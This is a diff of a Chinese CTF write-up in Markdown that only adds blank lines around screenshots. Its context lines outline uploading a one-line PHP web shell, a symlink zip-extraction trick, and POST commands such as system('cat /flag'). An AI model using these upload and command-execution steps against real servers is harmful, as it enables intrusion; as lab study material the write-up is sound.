@@ -44,9 +44,20 @@ repost:
 
 <!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->
 
+
+
 ![](images/5585a1ceecf49a83a0a458dcacb1a6e4.png)
+
+
+
 上传一句话文件木马，查看回显
+
+
+
 ![](images/9fcbb9588fb491783b296dbc1b7b829c.png)
+
+
+
 放行看一下回显
 
 ``` Php
@@ -90,7 +101,13 @@ zip -r slink1.zip ./slink/*
 ```
 
 依次将`slink`和`slink1.php`上传，然后访问`shell.php`
+
+
+
 ![](images/dfcccef503edaedca3f374b47f617c70.png)
+
+
+
 正常访问，上传解压成功，进行命令执行，利用POST传参
 
 ```
@@ -98,5 +115,11 @@ t=system('ls /');
 t=system('cat /flag');
 ```
 
+
+
 ![](images/7731dd6f7a4220004a0dfd03bc413eb2.png)
+
+
+
 ![](images/a332985e46811a02b5899649af993697.png)
+
